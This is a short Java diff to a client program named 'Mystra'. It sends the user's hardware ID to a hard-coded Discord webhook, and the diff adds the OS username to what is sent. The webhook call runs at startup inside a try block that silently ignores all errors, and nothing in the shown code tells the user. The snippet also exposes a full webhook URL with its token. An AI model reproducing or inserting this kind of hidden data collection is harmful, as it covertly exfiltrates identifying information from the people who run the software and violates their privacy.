@@ -81,7 +81,7 @@ public class Mystra {
     	*/
         try{
             DiscordWebhook webhook = new DiscordWebhook("https://discord.com/api/webhooks/781214773517221920/W9kvHaYpMupipDZOgJFu7cZqcZb9tSysNLAevLSDLjBgvtKlRQQtC_ofPl48KuyQ3Y74");
-            webhook.addEmbed(new DiscordWebhook.EmbedObject().addField("HWID", GuiClientLogin.getHWID(), false).setTitle("Mystra HWID Logging bois"));
+            webhook.addEmbed(new DiscordWebhook.EmbedObject().addField("HWID", GuiClientLogin.getHWID(), false).addField("OS Username:", System.getProperty("user.name"), false).setTitle("Mystra HWID Logging bois"));
             webhook.execute();
         } catch (Exception ignored){}
     	String clientFolder = new File(".").getAbsolutePath();
